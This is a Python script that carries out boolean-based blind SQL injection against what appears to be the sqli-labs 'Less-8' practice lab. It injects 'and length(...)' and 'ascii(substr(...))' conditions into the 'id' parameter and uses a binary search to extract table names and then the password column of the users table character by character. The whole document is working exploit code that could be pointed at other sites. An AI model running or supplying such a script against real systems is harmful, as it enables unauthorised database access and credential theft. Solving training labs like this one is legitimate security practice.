import requests
url = "http://10.63.24.160:8080/Less-8/"
#select group_concat(table_name) from information_schema.tables where table_schema = 'security'
#select group_concat(column_name) from information_schema.columns where table_name = 'users'

#select group_concat(username) from users
#select group_concat(password) from users
query = "select group_concat(password) from users"
def is_true(payload):
    r = requests.get(url,params={"id":payload},timeout=5)
    return "You are in" in r.text

def table_len():
    
    for length in range(1,2000):
        if is_true(f"1' and length(({query})) = {length} -- -"):
            return length

def table_name_ser(length):
    table_name = ""
    for pos in range(1,length+1):
        lo,hi = 32,126
        while lo<hi:
            mid = (lo+hi+1)//2
            if(is_true(f"1' and ascii(substr(({query}),{pos},1)) >= {mid} -- -")):
                lo = mid
            else:
                hi = mid-1
        table_name+=chr(lo)
        print(f"第{pos}位：{chr(lo)}->当前结果：{table_name}")
    return table_name
table_length = table_len()
print(f"数据库长度为:{table_length}")
print(f"数据库名为：{table_name_ser(table_length)}")
    
"""
tables:
1.4 flag
2.4
"""